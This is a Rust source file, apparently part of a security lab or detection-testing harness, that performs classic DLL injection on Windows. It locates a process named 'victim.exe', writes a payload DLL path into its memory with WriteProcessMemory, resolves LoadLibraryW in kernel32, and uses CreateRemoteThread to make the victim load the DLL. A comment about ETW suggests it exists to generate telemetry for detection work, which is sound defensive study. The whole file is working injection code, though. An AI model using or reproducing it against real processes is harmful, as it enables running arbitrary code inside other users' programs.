use std::os::windows::ffi::OsStrExt;
use std::time;

use common::raii::{HandleRAII, RemoteAllocRAII};
use common::utils::{find_pid_by_name, open_process};

use windows_sys::Win32::Foundation::{FALSE, GetLastError, HMODULE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows_sys::Win32::System::Memory::PAGE_READWRITE;
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
    PROCESS_VM_WRITE, WaitForSingleObject,
};
use windows_sys::core::{BOOL, PCSTR};

fn main() {
    println!("Started with PID {}.", std::process::id());

    let victim_name = "victim.exe";

    let dll_path_arg = std::env::args().nth(1).expect("Usage: attack_01_dll_injection.exe <payload dll path>");
    let dll_path = std::path::PathBuf::from(dll_path_arg).canonicalize().expect("DLL path invalid or not found");
    let dll_path: Vec<u16> = dll_path.as_os_str().encode_wide().chain(Some(0)).collect();

    // Open Process
    let victim_pid = find_pid_by_name(victim_name).expect("Couldn't find the victim's process");
    let rights =
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
    let victim = open_process(victim_pid, Some(rights))
        .expect("Couldn't get victim handle. Is victim still running?");

    // Allocate Memory for DLL Path
    let alloc_addr = RemoteAllocRAII::new(&victim, dll_path.len() * 2, PAGE_READWRITE)
        .expect("Failed to Allocate Adrress on Process");

    // Write DLL Path to Memory
    let mut bytes_written = 0;
    let w_success: BOOL = unsafe {
        WriteProcessMemory(
            victim.as_raw(),
            alloc_addr.as_ptr(),
            dll_path.as_ptr() as _,
            dll_path.len() * 2,
            &mut bytes_written,
        )
    };
    if w_success == FALSE {
        eprintln!("Failed to Write Memory to Process: {}", unsafe {
            GetLastError()
        });
        return;
    }

    // Create Remote Thread with kernel32.LoadLibrary as Routine, and dll_path in-process address as parameter
    // Resolve callback address
    let ke32_path: Vec<u16> = "kernel32.dll".encode_utf16().chain(Some(0)).collect();
    let ke32_mod: HMODULE = unsafe { GetModuleHandleW(ke32_path.as_ptr()) };
    if ke32_mod.is_null() {
        eprintln!("Failed to Get kernel32 Module Handle: {}", unsafe {
            GetLastError()
        });
        return;
    }

    let load_lib_addr = unsafe { GetProcAddress(ke32_mod, c"LoadLibraryW".as_ptr() as PCSTR) };
    if load_lib_addr.is_none() {
        eprintln!("Failed to Get LoadLibraryW Address: {}", unsafe {
            GetLastError()
        });
        return;
    }
    let load_lib_addr = unsafe {
        std::mem::transmute::<
            Option<unsafe extern "system" fn() -> isize>,
            Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>,
        >(load_lib_addr)
    };

    // Create thread
    let thread_h_raw = unsafe {
        CreateRemoteThread(
            victim.as_raw(),
            std::ptr::null_mut(),
            0,
            load_lib_addr,
            alloc_addr.as_ptr().cast_const(),
            0,
            std::ptr::null_mut(),
        )
    };
    let thread_h = HandleRAII::new(thread_h_raw).expect("Unable to Retrieve Thread Handle");

    // Wait for Running
    unsafe {
        WaitForSingleObject(thread_h.as_raw(), 5000);
    }

    // Dummy! Make this readable by ETW
    std::thread::sleep(time::Duration::from_secs(60));
}
